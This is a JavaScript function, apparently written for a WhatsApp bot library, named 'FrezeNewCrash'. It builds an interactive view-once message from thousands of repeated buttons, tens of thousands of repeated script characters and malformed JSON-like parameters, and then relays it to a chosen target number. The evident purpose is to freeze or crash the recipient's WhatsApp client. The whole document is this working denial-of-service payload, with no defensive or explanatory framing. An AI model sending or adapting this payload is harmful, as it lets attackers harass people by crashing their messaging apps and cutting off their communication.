async function FrezeNewCrash(sock, target, ptcp = true) {
  let AmeliaG = [];

  AmeliaG.push({
    name: "single_select",
    buttonParamsJson: "\u0003",
  });

  for (let i = 0; i < 5000; i++) {
    AmeliaG.push({
      name: "call_permission_request",
      buttonParamsJson: "\u0003",
    });
  }

  AmeliaG.push({
    name: "call_permission_request",
    buttonParamsJson: "\u0003",
  });

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝗔𝗠𝗘𝗟𝗜𝗔 𝗡𝗢𝗧 𝗚𝗧",
              hasMediaAttachment: false,
            },
            body: {
               text: "Apakah Kamu Ayam" + "ꦽ".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{{".repeat(10000),
              paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "⛧ 𐌃𐌀𐌍𐌂𐌄𐍂 :: 𐌀𐍂𐌄𐌀 ⛧",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "cyber@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(25000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }`,
              version: 3,
              buttons: AmeliaG,
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(
    target,
    msg.message,
    ptcp
      ? {
        participant: {
          jid: target,
        },
      }
      : {}
  );
}